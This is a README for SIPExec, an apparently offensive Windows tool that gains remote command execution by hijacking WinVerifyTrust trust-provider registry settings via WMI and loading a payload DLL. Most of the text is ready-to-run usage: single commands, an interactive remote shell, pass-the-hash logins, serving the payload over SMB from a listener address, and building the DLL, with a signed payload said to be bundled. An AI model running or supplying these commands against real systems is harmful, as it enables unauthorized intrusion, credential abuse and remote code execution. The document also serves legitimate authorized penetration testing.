# SIPExec

Remote command execution through WinVerifyTrust FinalPolicy hijacking.
SIPExec stages a payload DLL, updates the target's trust-provider registry
configuration through WMI, triggers a fresh WMI provider load, and communicates
with the payload over `\\target\pipe\sipexec`.

Use only on systems you own or are authorized to test.

## Requirements

- Python 3
- `impacket`
- Administrative access to the Windows target
- SMB and DCOM/WMI connectivity

```bash
python3 -m pip install impacket
```

## Usage

```bash
# Upload the bundled payload, run one command, then clean up
python3 sipexec.py 'DOMAIN/user:password@target' whoami

# Interactive shell
python3 sipexec.py 'DOMAIN/user:password@target'

# Pass the hash
python3 sipexec.py -hashes :NTHASH 'DOMAIN/user@target' whoami

# Serve the payload over SMB instead of writing it to the target
sudo python3 sipexec.py -serve -listen 192.0.2.10 \
  'DOMAIN/user:password@target' whoami

# Use a payload already accessible to the target
python3 sipexec.py -dll 'C:\Windows\Temp\sipexec_payload.dll' \
  'DOMAIN/user:password@target' whoami
```

Run `python3 sipexec.py -h` for all authentication and delivery options.

## Build

The repository includes the ready-to-use signed payload. To rebuild an unsigned
payload from source:

```bash
x86_64-w64-mingw32-gcc -shared -O2 -Wall \
  -o sipexec_payload.dll sipexec_payload.c
```

The orchestrator prefers `sipexec_payload_signed.dll` when present and otherwise
uses `sipexec_payload.dll`.
